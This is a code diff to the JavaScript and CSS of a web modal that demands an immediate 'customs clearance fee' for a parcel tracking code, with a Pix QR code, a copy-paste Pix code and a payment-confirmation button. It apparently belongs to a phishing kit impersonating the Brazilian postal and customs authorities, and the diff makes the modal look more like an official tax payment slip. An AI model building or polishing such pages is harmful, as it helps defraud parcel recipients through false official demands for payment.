@@ -77,244 +77,169 @@ const CSS = `
   left: 0;
   width: 100vw;
   height: 100vh;
-  background: rgba(0, 37, 64, 0.68);
-  backdrop-filter: blur(3px);
-  -webkit-backdrop-filter: blur(3px);
+  background: rgba(0, 0, 0, 0.55);
   z-index: 9999999;
   align-items: center;
   justify-content: center;
-  padding: 16px;
+  padding: 12px;
   box-sizing: border-box;
 }
 .customs-modal-box {
   background: #ffffff;
-  border-radius: 6px;
   width: 100%;
-  max-width: 520px;
-  box-shadow: 0 16px 40px rgba(0, 0, 0, 0.28);
+  max-width: 500px;
+  border: 1px solid #708090;
   border-top: 4px solid #ffc40c;
-  overflow: hidden;
-  position: relative;
-  animation: customsModalAnim 0.2s cubic-bezier(0.16, 1, 0.3, 1);
+  box-shadow: 2px 2px 8px rgba(0, 0, 0, 0.35);
   box-sizing: border-box;
-}
-@keyframes customsModalAnim {
-  from { opacity: 0; transform: scale(0.96) translateY(10px); }
-  to { opacity: 1; transform: scale(1) translateY(0); }
+  font-family: Arial, Helvetica, sans-serif;
 }
 .customs-modal-header {
-  padding: 18px 22px 14px 22px;
-  border-bottom: 1px solid #e2e8f0;
+  background: #00416b;
+  color: #ffffff;
+  padding: 9px 12px;
   display: flex;
-  align-items: flex-start;
+  align-items: center;
   justify-content: space-between;
-  background: #ffffff;
-}
-.customs-modal-title-group {
-  flex: 1;
-}
-.customs-modal-badge {
-  display: inline-block;
-  font-size: 0.7rem;
-  font-weight: 800;
-  text-transform: uppercase;
-  letter-spacing: 0.6px;
-  padding: 3px 8px;
-  border-radius: 3px;
-  background: #fef3c7;
-  color: #92400e;
-  margin-bottom: 6px;
+  border-bottom: 2px solid #ffc40c;
 }
 .customs-modal-title {
-  font-size: 1.15rem;
-  font-weight: 800;
-  color: #00416b;
+  font-size: 0.92rem;
+  font-weight: bold;
+  color: #ffffff;
   margin: 0;
-  line-height: 1.3;
+  text-transform: uppercase;
 }
 .customs-modal-close {
   background: transparent !important;
   border: none !important;
-  font-size: 1.8rem !important;
-  color: #64748b !important;
+  font-size: 1.3rem !important;
+  color: #ffffff !important;
   cursor: pointer !important;
-  padding: 0 6px !important;
-  margin-left: 12px !important;
   line-height: 1 !important;
-  transition: color 0.15s !important;
+  padding: 0 4px !important;
+  font-weight: bold !important;
 }
 .customs-modal-close:hover {
-  color: #00416b !important;
+  color: #ffc40c !important;
 }
 .customs-modal-body {
-  padding: 20px 22px;
-  max-height: calc(85vh - 120px);
+  padding: 14px 16px;
+  max-height: calc(90vh - 70px);
   overflow-y: auto;
   box-sizing: border-box;
+  color: #333333;
+  font-size: 0.85rem;
+  line-height: 1.45;
 }
 .customs-modal-desc {
-  font-size: 0.88rem;
-  color: #475569;
-  line-height: 1.5;
-  margin: 0 0 16px 0;
+  margin: 0 0 12px 0;
+  font-size: 0.84rem;
+  color: #333333;
+  line-height: 1.4;
+  border-left: 3px solid #ffc40c;
+  padding: 6px 10px;
+  background: #fffbe6;
 }
-.customs-fee-card {
-  background: #f8fafc;
-  border: 1px dashed #cbd5e1;
-  border-radius: 4px;
-  padding: 14px 16px;
-  margin-bottom: 18px;
-  display: flex;
-  align-items: center;
-  justify-content: space-between;
-  flex-wrap: wrap;
-  gap: 10px;
+.customs-table {
+  width: 100%;
+  border-collapse: collapse;
+  margin-bottom: 12px;
+  font-size: 0.82rem;
+  border: 1px solid #cccccc;
 }
-.customs-fee-label {
-  font-size: 0.74rem;
-  font-weight: 700;
-  text-transform: uppercase;
-  color: #64748b;
-  letter-spacing: 0.5px;
-  margin-bottom: 2px;
+.customs-table th, .customs-table td {
+  padding: 6px 8px;
+  border: 1px solid #cccccc;
+  text-align: left;
 }
-.customs-fee-amount {
-  font-size: 1.45rem;
-  font-weight: 800;
+.customs-table th {
+  background: #f2f4f7;
+  color: #00416b;
+  font-weight: bold;
+  width: 38%;
+}
+.customs-table td {
+  background: #ffffff;
+  color: #222222;
+}
+.customs-table .valor-destaque {
+  font-size: 1.15rem;
+  font-weight: bold;
   color: #00416b;
 }
-.customs-fee-meta {
-  text-align: right;
-}
-.customs-fee-due {
-  font-size: 0.74rem;
-  font-weight: 600;
-  color: #64748b;
-}
-.customs-fee-pix {
-  font-size: 0.76rem;
-  font-weight: 700;
-  color: #00874e;
-}
-
-
-.btn-customs-pay-main {
-  width: 100% !important;
-  min-height: 48px !important;
-  height: auto !important;
-  display: flex !important;
-  align-items: center !important;
-  justify-content: center !important;
-  gap: 8px !important;
-  padding: 13px 20px !important;
-  background: #ffc40c !important;
-  color: #00416b !important;
-  border: 1px solid #e5b00b !important;
-  border-radius: 4px !important;
-  font-size: 0.95rem !important;
-  font-weight: 800 !important;
-  cursor: pointer !important;
-  box-shadow: 0 2px 4px rgba(0,0,0,0.08) !important;
-  transition: all 0.15s ease !important;
-  text-decoration: none !important;
-  box-sizing: border-box !important;
-  margin-top: 6px !important;
-  line-height: normal !important;
-  overflow: visible !important;
-  white-space: normal !important;
-}
-.btn-customs-pay-main:hover {
-  background: #f0b70a !important;
-  color: #002e4d !important;
-  box-shadow: 0 3px 6px rgba(0,0,0,0.12) !important;
-}
-.btn-customs-pay-main span {
-  color: #00416b !important;
-  font-size: 0.95rem !important;
-  font-weight: 800 !important;
-  line-height: normal !important;
-}
-.btn-customs-pay-main svg {
-  color: #00416b !important;
-  stroke: #00416b !important;
-  min-width: 18px !important;
-  min-height: 18px !important;
-  display: inline-block !important;
-}
-
-
-.customs-pix-container {
-  display: none;
+.customs-pix-section {
   background: #f8fafc;
-  border: 1px solid #e2e8f0;
-  border-radius: 4px;
-  padding: 16px;
-  margin-top: 14px;
-  text-align: center;
+  border: 1px solid #cccccc;
+  padding: 12px;
+  margin-top: 10px;
   box-sizing: border-box;
 }
-.customs-pix-qr {
-  width: 180px;
-  height: 180px;
-  display: block;
-  margin: 0 auto 12px auto;
-  background: #ffffff;
-  padding: 4px;
-  border: 1px solid #cbd5e1;
-  border-radius: 4px;
+.customs-pix-instrucoes {
+  font-size: 0.8rem;
+  color: #333333;
+  margin-bottom: 10px;
+  line-height: 1.35;
 }
-.customs-pix-code-field {
+.customs-pix-qr {
+  width: 160px;
+  height: 160px;
+  display: block;
+  margin: 0 auto 10px auto;
+  background: #ffffff;
+  padding: 3px;
+  border: 1px solid #999999;
+}
+.customs-pix-input {
   width: 100% !important;
-  padding: 9px 12px !important;
-  border: 1px solid #cbd5e1 !important;
-  border-radius: 4px !important;
-  font-family: monospace !important;
-  font-size: 0.8rem !important;
+  padding: 6px 8px !important;
+  border: 1px solid #999999 !important;
+  font-family: 'Courier New', Courier, monospace !important;
+  font-size: 0.78rem !important;
   background: #ffffff !important;
-  color: #1e293b !important;
-  margin-bottom: 10px !important;
+  color: #111111 !important;
+  margin-bottom: 8px !important;
   box-sizing: border-box !important;
 }
-.btn-customs-copy {
+.btn-php-copy {
   width: 100% !important;
-  display: flex !important;
-  align-items: center !important;
-  justify-content: center !important;
-  gap: 6px !important;
-  padding: 10px 16px !important;
+  padding: 8px 12px !important;
   background: #00416b !important;
   color: #ffffff !important;
-  border: none !important;
-  border-radius: 4px !important;
-  font-size: 0.88rem !important;
-  font-weight: 700 !important;
+  border: 1px solid #002e4d !important;
+  font-size: 0.82rem !important;
+  font-weight: bold !important;
   cursor: pointer !important;
-  transition: background 0.15s !important;
-  margin-bottom: 10px !important;
+  text-transform: uppercase !important;
+  margin-bottom: 6px !important;
   box-sizing: border-box !important;
 }
-.btn-customs-copy:hover {
+.btn-php-copy:hover {
   background: #002e4d !important;
 }
-.btn-customs-confirm {
+.btn-php-confirm {
   width: 100% !important;
-  display: flex !important;
-  align-items: center !important;
-  justify-content: center !important;
-  padding: 11px 16px !important;
+  padding: 9px 12px !important;
   background: #00874e !important;
   color: #ffffff !important;
-  border: none !important;
-  border-radius: 4px !important;
-  font-size: 0.9rem !important;
-  font-weight: 700 !important;
+  border: 1px solid #006638 !important;
+  font-size: 0.85rem !important;
+  font-weight: bold !important;
   cursor: pointer !important;
-  transition: background 0.15s !important;
+  text-transform: uppercase !important;
   box-sizing: border-box !important;
 }
-.btn-customs-confirm:hover {
-  background: #006b3e !important;
+.btn-php-confirm:hover {
+  background: #006638 !important;
 }
+.customs-rodape-aviso {
+  font-size: 0.72rem;
+  color: #666666;
+  text-align: center;
+  margin-top: 8px;
+  margin-bottom: 0;
+}
+
 `;
 (function(){
   const s = document.createElement('style');
@@ -359,61 +284,72 @@ function renderCustomsModal(d) {
 
   const c = d.customs;
   const feeFormatted = (c.fee || 0).toLocaleString('pt-BR', { minimumFractionDigits: 2 });
+  const code = d.trackingCode || '';
+  const title = c.title || 'Taxa de Despacho Aduaneiro / Receita Federal';
 
   modal.innerHTML = `
     <div class="customs-modal-box" onclick="event.stopPropagation()">
       <div class="customs-modal-header">
-        <div class="customs-modal-title-group">
-          <span class="customs-modal-badge">Aviso da Fiscalização Aduaneira</span>
-          <h3 class="customs-modal-title">${c.title || 'Taxa de Despacho Aduaneiro / Receita Federal'}</h3>
-        </div>
+        <span class="customs-modal-title">Guia de Recolhimento - Despacho Postal</span>
         <button type="button" class="customs-modal-close" onclick="closeCustomsModal()" title="Fechar">×</button>
       </div>
 
       <div class="customs-modal-body">
         <p class="customs-modal-desc">
-          O seu objeto foi selecionado para conferência aduaneira no <strong>Centro Internacional de Curitiba / PR</strong>.
-          De acordo com as normas da Receita Federal, é necessário efetuar o pagamento do tributo de importação / despacho para que a encomenda seja liberada para entrega.
+          Objeto <strong>${code}</strong> com exigência fiscal/aduaneira pendente de regularização.
+          Para liberação do lote e continuidade do transporte até a cidade de destino, é exigida a quitação da guia discriminada.
         </p>
 
-        <div class="customs-fee-card">
-          <div>
-            <div class="customs-fee-label">Valor da Taxa a Pagar</div>
-            <div class="customs-fee-amount">R$ ${feeFormatted}</div>
-          </div>
-          <div class="customs-fee-meta">
-            <div class="customs-fee-due">Vencimento: Imediato</div>
-            <div class="customs-fee-pix">Compensação Instantânea via Pix</div>
-          </div>
-        </div>
+        <table class="customs-table">
+          <tbody>
+            <tr>
+              <th>Objeto</th>
+              <td><strong>${code}</strong></td>
+            </tr>
+            <tr>
+              <th>Discriminação</th>
+              <td>${title}</td>
+            </tr>
+            <tr>
+              <th>Vencimento</th>
+              <td>Imediato</td>
+            </tr>
+            <tr>
+              <th>Valor Total</th>
+              <td class="valor-destaque">R$ ${feeFormatted}</td>
+            </tr>
+            <tr>
+              <th>Forma de Pagamento</th>
+              <td>PIX (Compensação automática)</td>
+            </tr>
+          </tbody>
+        </table>
 
-        <button type="button" class="btn-customs-pay-main" id="btn-show-pix" onclick="togglePixDrawer()">
-          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><rect x="3" y="3" width="7" height="7"></rect><rect x="14" y="3" width="7" height="7"></rect><rect x="14" y="14" width="7" height="7"></rect><rect x="3" y="14" width="7" height="7"></rect></svg>
-          <span id="btn-pay-text">Pagar Taxa via Pix (Gerar QR Code)</span>
-        </button>
+        <div class="customs-pix-section">
+          <div class="customs-pix-instrucoes">
+            <strong>Instruções para pagamento via PIX:</strong><br>
+            1. Acesse o aplicativo do seu banco e escolha a opção <strong>PIX</strong>.<br>
+            2. Selecione <strong>Ler QR Code</strong> e aponte a câmera para a imagem abaixo, ou utilize o <strong>PIX Copia e Cola</strong>.<br>
+            3. Efetue a transferência do valor de <strong>R$ ${feeFormatted}</strong>.
+          </div>
 
-        <div class="customs-pix-container" id="customs-pix-container" style="display: none;">
-          <p style="font-size: 0.85rem; font-weight: 700; color: #00416b; margin-top: 0; margin-bottom: 12px;">
-            Escaneie o QR Code no app do seu banco ou use o Pix Copia e Cola:
-          </p>
           <img src="${c.pixQrCode}" alt="QR Code Pix" class="customs-pix-qr">
-          
-          <div style="text-align: left; margin-bottom: 4px;">
-            <label style="font-size: 0.74rem; font-weight: 700; color: #64748b;">Código Pix Copia e Cola:</label>
+
+          <div style="text-align: left; margin-bottom: 3px;">
+            <label style="font-size: 0.74rem; font-weight: bold; color: #333333;">Código PIX Copia e Cola:</label>
           </div>
-          <input type="text" readonly value="${c.pixCode}" id="pix-copy-input" class="customs-pix-code-field">
-          
-          <button type="button" class="btn-customs-copy" onclick="copyPixPayload()">
-            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
+          <input type="text" readonly value="${c.pixCode}" id="pix-copy-input" class="customs-pix-input">
+
+          <button type="button" class="btn-php-copy" onclick="copyPixPayload()">
             <span id="btn-copy-text">Copiar Código Pix</span>
           </button>
 
-          <button type="button" class="btn-customs-confirm" id="btn-confirm-pay" onclick="submitCustomsPayment('${d.trackingCode}')">
+          <button type="button" class="btn-php-confirm" id="btn-confirm-pay" onclick="submitCustomsPayment('${d.trackingCode}')">
             Já Efetuei o Pagamento via Pix
           </button>
-          
-          <p style="font-size: 0.72rem; color: #64748b; margin-top: 10px; margin-bottom: 0;">
-            A liberação aduaneira ocorre no sistema logo após a confirmação do pagamento.
+
+          <p class="customs-rodape-aviso">
+            A baixa da restrição ocorre de forma automática pelo sistema bancário após a confirmação.
           </p>
         </div>
       </div>
@@ -574,7 +510,14 @@ function copyPixPayload() {
   if (!input) return;
   input.select();
   navigator.clipboard.writeText(input.value);
-  alert('Código Pix Copia e Cola copiado para a área de transferência! Abra o aplicativo do seu banco para colar e pagar.');
+  const btnText = document.getElementById('btn-copy-text');
+  if (btnText) {
+    btnText.textContent = 'CÓDIGO PIX COPIADO!';
+    setTimeout(() => {
+      btnText.textContent = 'Copiar Código Pix';
+    }, 3000);
+  }
+  alert('Código Pix Copia e Cola copiado com sucesso! Abra o aplicativo do seu banco para colar e pagar.');
 }
 
 async function submitCustomsPayment(code) {
